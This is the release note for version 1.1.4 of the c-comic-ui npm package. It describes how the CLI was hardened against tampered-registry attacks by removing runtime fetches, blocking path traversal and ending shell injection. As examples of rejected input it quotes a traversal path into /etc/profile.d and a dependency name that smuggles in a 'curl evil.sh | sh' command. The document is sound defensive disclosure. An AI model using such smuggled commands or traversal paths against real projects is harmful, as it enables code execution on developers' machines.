# c-comic-ui v1.1.4

Security release. `npx c-comic` no longer trusts anything it did not ship with.

```bash
npm install c-comic-ui@1.1.4
```

## Security

The CLI used to treat the component registry as trusted input. A tampered registry could write
arbitrary files into your project and influence the command used to install dependencies. All three
paths are now closed:

- **No runtime downloads.** `c-comic add` and `c-comic list` read only the `registry.json` bundled in
  the installed package. The unverified `raw.githubusercontent.com` fallback fetch was removed, so the
  CLI can only ever write code from the exact version you installed and audited. A missing bundled
  registry is a hard error instead of a silent network fetch.
- **No path traversal.** Registry file names must be plain basenames matching
  `^[a-z0-9][a-z0-9.-]*\.(ts|tsx)$`, and every write is re-checked to resolve inside
  `components/comic-ui`. Entries like `../../../etc/profile.d/evil.ts` are rejected.
- **No shell injection.** `execSync("npm install " + packages.join(" "))` was replaced with
  `spawnSync("npm", ["install", "--", ...packages], { shell: false })`, and package names are
  validated against the npm name grammar, so a dependency such as `clsx; curl evil.sh | sh` is
  rejected before it reaches npm.

Validation is exposed as `validateEntry(name, entry)` and runs both when the registry is loaded and
again for each entry as it is written.

## Tests

43 tests pass, including new ones asserting the CLI source contains no `fetch(` or `execSync`, and
that traversal, shell-injection and malformed component-dependency entries are rejected.

## Upgrading

Drop-in. No API, export or CLI-command changes from 1.1.3 — only the CLI's internals were hardened.

```bash
npm install c-comic-ui@latest
```

**Full changelog:** https://github.com/KeneanDita/C-comic-ui/compare/v1.1.3...v1.1.4
